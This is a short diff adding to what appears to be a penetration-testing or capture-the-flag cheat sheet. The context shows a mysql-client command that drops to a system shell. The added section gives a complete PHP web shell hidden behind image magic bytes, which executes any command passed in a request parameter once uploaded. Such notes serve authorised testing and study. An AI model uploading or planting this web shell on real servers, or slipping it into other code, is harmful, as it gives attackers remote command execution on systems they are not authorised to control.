@@ -47,3 +47,6 @@ If when intercepting the server responses with a proxy and the `302 Found` respo
 ### Shell from mysql
 Run this from mysql to drop to a shell and see what user you are on:
 `\! /bin/sh`
+
+### Injecting php shell in image file
+`{{imageMagicBytes}} <?php echo system($_REQUEST[\'ippsec']); ?>`
